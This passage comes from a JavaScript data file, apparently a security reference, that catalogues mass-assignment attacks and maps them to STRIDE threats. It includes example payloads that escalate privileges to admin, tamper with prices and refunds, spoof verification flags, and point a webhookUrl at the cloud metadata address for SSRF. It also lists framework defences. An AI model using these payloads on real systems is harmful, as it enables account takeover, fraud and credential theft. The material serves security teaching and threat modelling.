        heading: 'Escalate privilege by binding role fields',
        body: [
          'Take a legitimate update request the app already accepts and add a privileged field to the body. If the response reflects the new value or a later read shows it persisted, the endpoint mass assigns. Role and admin flags are the direct path to takeover; a re authentication or a fresh token then carries the elevated rights.',
        ],
        examples: [
          { code: "PUT /api/users/123   {\"firstName\":\"Sam\",\"roles\":[{\"name\":\"ADMIN\"}]}   or   {\"isAdmin\":true}", note: 'If persisted, the account gains administrative rights on the next authenticated action.' },
        ],
      },
      {
        heading: 'Tamper with ownership and business fields',
        body: [
          'Beyond roles, bind the fields that hold money, state, and ownership. Nested binding reparents an object into another tenant, and business fields on a checkout or refund endpoint let you set your own price or refund. Because binding precedes the business logic, values the server meant to compute are overwritten by your input.',
        ],
        examples: [
          { code: "Reparent:  {\"profile\":{\"organizationId\":7}}   or   {\"order\":{\"owner\":{\"id\":7}}}", note: 'Nested autobinding moves the record into a tenant or owner you choose.' },
          { code: "Checkout tamper:  {\"items\":[...],\"price\":0.01,\"refundAmount\":9999.99,\"status\":\"PAID\"}", note: 'Writable money and status fields let you buy for nothing or mark an order paid.' },
        ],
      },
      {
        heading: 'Spoof trust flags and chain backend fields',
        body: [
          'Verification and trust flags are often plain columns, so binding emailVerified or a KYC status marks the account trusted without doing any verification. Backend processing fields are the dangerous chain: if a bindable templateId, webhookUrl, or filePath reaches server code, mass assignment becomes the delivery vehicle for SSRF, file read, or template injection.',
        ],
        examples: [
          { code: "Trust spoof:  {\"emailVerified\":true,\"kycStatus\":\"APPROVED\"}", note: 'Claims a verified, trusted identity the user never actually proved.' },
          { code: "Chain:  {\"webhookUrl\":\"http://169.254.169.254/latest/meta-data/\"}   bound then fetched by the backend", note: 'A writable processing field turns mass assignment into SSRF or file access.' },
        ],
      },
      {
        heading: 'Framework patterns and defenses',
        body: [
          'The vulnerable idiom is binding the raw body straight to a model: Mongoose findByIdAndUpdate(id, req.body), Rails update(params[:user]), Laravel guarded set to empty, Django fields set to all, Spring or ASP.NET saving a request bound entity. Fix it with an explicit allowlist per endpoint (Rails strong parameters permit, Laravel fillable), a dedicated DTO or view model that contains only the safe fields, rejecting unknown fields (Pydantic extra forbid, DisallowUnknownFields), marking privileged fields read only or json ignored, and moving privilege and ownership changes to separate admin only endpoints with their own authorization.',
        ],
        examples: [
          { code: "Vulnerable:  User.findByIdAndUpdate(req.params.id, req.body)   /   @user.update(params[:user])   /   protected $guarded = [];", note: 'Each binds every request key onto the model with no allowlist.' },
        ],
      },
    ],
    stride: {
      elevation_of_privilege: {
        weaponization: [
          'Inject role, roles, isAdmin, or permissions into a create or update body so a self service endpoint grants the attacker administrative rights.',
          'Bind a status or account type field that gates privileged features to promote the account past its intended tier.',
          'Set a bindable backend processing field (templateId, webhookUrl, filePath) that chains into SSRF, file read, or template injection for deeper compromise.',
        ],
        why: 'Autobinding writes the properties before any authorization rule runs, so privilege fields the developer assumed were server controlled become directly settable by the user.',
      },
      tampering: {
        weaponization: [
          'Overwrite business fields such as price, discount, balance, refundAmount, or status to manipulate transactions and stored state.',
          'Reparent a record into another tenant or owner through nested binding of ownerId, organizationId, or a nested owner object.',
          'Change fields the server intended to compute so the persisted object reflects attacker chosen values.',
        ],
        why: 'Because the bind happens before business logic and without an allowlist, the attacker rewrites protected columns and moves objects across ownership boundaries at will.',
      },
      spoofing: {
        weaponization: [
          'Bind emailVerified, verified, or a KYC status to mark the account as a trusted, proven identity without performing any verification.',
          'Set an identity or ownership field (userId, ownerId) so actions and records appear to belong to another user.',
        ],
        why: 'Trust and identity flags are frequently ordinary bindable columns, so writing them lets the attacker present a verified or different identity they never legitimately hold.',
      },
    },
  },
];

// All attacks that are weaponized to achieve a given STRIDE category.
export function attacksForCategory(categoryKey) {
  return attacks.filter((a) => a.stride && a.stride[categoryKey]);
}
